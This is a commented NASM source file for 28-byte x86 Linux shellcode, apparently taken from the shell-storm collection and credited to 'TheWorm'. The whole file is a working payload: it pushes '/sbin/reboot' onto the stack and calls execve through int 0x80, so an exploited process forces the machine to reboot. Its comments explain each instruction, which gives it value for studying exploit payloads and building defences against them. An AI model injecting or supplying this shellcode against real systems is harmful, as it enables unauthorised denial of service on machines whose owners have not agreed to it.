; Filename: original.nasm
; Author: TheWorm
; Website: http://shell-storm.org/shellcode/files/shellcode-477.php
; Date: 11/07/2009
; Size: 28 bytes

global _start

section .text
_start:
  push 0xb          ; sys_execve
  pop eax           ; pop into EAX
  cltd              ; cltd converts the signed long in EAX to a signed double long in EDX:EAX
                    ; by extending the most-significant bit (sign bit) of EAX into all bits of EDX.
                    ; Thus we zero out EDX
  push edx          ; null string terminator
  push 0x746f6f62   ; toob
  push 0x65722f6e   ; er/n
  push 0x6962732f   ; ibs/ - this completes /sbin/reboot in little-endian with a null terminator
  mov ebx, esp      ; move a pointer to our string into EBX
  push edx          ; NULL argument
  push ebx          ; NULL argument
  mov ecx, esp      ; move pointer to arguments into ECX
  int 0x80          ; execve /sbin/reboot
